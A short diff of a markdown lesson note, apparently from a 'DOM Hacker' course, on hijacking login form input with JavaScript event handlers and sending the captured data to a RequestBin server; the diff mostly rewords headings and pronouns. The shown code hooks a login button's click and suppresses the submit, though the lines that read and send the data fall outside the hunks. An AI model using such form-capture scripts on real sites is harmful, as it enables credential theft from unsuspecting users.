@@ -1,12 +1,12 @@
-# DOM Hacker Class 02 - Input Hijacking & Live Data Capture
+# Input Hijacking & Live Data Capture
 
 ## Lessoons learnt
 > - How to grab user input in real-time using DOM
 > - How to listen for `onclick` or `onsubmit` events
-> - Sending data to your own server (RequestBin)
+> - Sending data to my own server (RequestBin)
 ------
 
-## ✅ Real-Time Input Capture Script
+## Real-Time Input Capture Script
 ```js
 document.getElementById("loginBtn").onclick = function(event) {
   event.preventDefault();
@@ -18,7 +18,7 @@ document.getElementById("loginBtn").onclick = function(event) {
 };
 ```
 ## Tip
-If the button or form doesn't exist yet when your script runs, use:
+If the button or form doesn't exist yet when my script runs, use:
 ```js
 window.onload = function() {
   // Your hijack code here
